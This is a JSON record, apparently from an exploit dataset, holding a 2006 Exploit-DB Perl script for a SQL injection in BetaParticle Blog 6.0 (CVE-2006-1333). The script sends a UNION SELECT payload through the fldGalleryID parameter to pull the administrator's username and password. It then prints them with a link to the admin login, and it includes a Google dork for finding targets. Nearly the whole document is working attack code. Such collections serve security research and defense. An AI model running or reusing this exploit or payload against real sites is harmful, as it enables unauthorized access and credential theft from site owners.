{
  "id": "1589",
  "title": "BetaParticle Blog 6.0 - &#039;fldGalleryID&#039; SQL Injection",
  "cve": "CVE-2006-1333",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=20\r\n#Usage: beta.pl <host> <path>\r\n#googledork: [ \"Powered by bp blog\" ] 9.710 pages..\r\nuse IO::Socket;\r\nif(@ARGV != 2) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-20\\r\\n\";\r\n  print \"- BetaParticle Blog <= 6.0 Remote SQL Injection Vulnerability\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to BetaParticle ex: /blog\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () {\r\n  #Our variables...\r\n  $bpserver = $ARGV[0];\r\n  $bpserver =~ s/(http:\\/\\/)//eg;\r\n  $bphost   = \"http://\".$bpserver;\r\n  $bpdir    = $ARGV[1];\r\n  $bpport   = \"80\";\r\n  $bptar    = \"template_gallery_detail.asp?fldGalleryID=\";\r\n  $bpfinal  = \"main.asp\";\r\n  $bpxp     = \"-1+UNION+SELECT+null,fldAuthorUsername,fldAuthorPassword,null,null+FROM+tblAuthor+where+fldAuthorId=1\";\r\n  $bpreq    = $bphost.$bpdir.$bptar.$bpxp;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $bpserver\\r\\n\";\r\n  $bp = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$bpserver\", PeerPort => \"$bpport\") || die \"- Connection failed...\\n\";\r\n  print $bp \"GET $bpreq HTTP/1.1\\n\";\r\n  print $bp \"Accept: */*\\n\";\r\n  print $bp \"Referer: $bphost\\n\";\r\n  print $bp \"Accept-Language: tr\\n\";\r\n  print $bp \"User-Agent: NukeZilla 4.3\\n\";\r\n  print $bp \"Cache-Control: no-cache\\n\";\r\n  print $bp \"Host: $bpserver\\n\";\r\n  print $bp \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  while ($answer = <$bp>) {\r\n    if ($answer =~ /<h3>(.*?)<\\/h3>/) {\r\n      print \"- Exploit succeed! Getting admin's information\\r\\n\";\r\n      print \"- Username: $1\\r\\n\";\r\n    }\r\n    if ($answer =~ /<p>(.*?)<\\/p>/) {\r\n      print \"- Password: $1\\r\\n\";\r\n      print \"- Lets go $bphost$bpdir$bpfinal for admin login.\\r\\n\";\r\n      exit();\r\n    }\r\n    if ($answer =~ /number of columns/) { \r\n      print \"- This version of BetaParticle is vulnerable too\\r\\n\";\r\n      print \"- but default query of SQL-Inj. does not work on it\\r\\n\";\r\n      print \"- So please edit query by manually adding null data..\\r\\n\";\r\n      exit(); \r\n    }\r\n  }\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# milw0rm.com [2006-03-18]",
  "url": "https://www.exploit-db.com/exploits/1589"
}